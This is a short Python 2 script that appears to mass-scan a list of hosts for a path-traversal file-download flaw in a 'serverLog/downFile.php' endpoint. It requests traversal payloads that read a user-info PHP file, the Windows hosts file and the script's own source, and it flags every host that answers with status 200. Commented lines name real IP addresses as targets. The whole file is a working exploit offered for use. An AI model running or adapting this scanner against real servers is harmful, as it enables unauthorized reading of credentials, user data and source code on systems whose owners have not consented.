# -*- coding: cp936 -*-
import requests

headers={'Content-Type':'application/x-www-form-urlencoded'}
def check(oldurl,url):
    try:
        rep1=requests.get(url,headers=headers,allow_redirects=False,timeout=1)
        if rep1.status_code==200:
            print url+'      yes'
    except Exception,e:
        print e
test=0

with open('hello_world.txt','r') as f:
    for i in f.readlines():
        test+=1
        print test
        url=i.strip('\n')
        test_url_1=url+'/serverLog/downFile.php?fileName=../web/html/data/saveUserInfo.php'
        test_url_2=url+'serverLog/downFile.php?fileName=../../../../../../WINDOWS/system32/drivers/etc/hosts'
        test_url_3=url+'/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php'
        check(url,test_url_1)
        check(url,test_url_2)
        check(url,test_url_3)


#url='http://211.67.95.41:7288/serverLog/downFile.php?fileName=../web/html/data/saveUserInfo.php'
#url='http://113.140.79.30:7288/serverLog/downFile.php?fileName=../web/html/data/saveUserInfo.php'
#check(url)
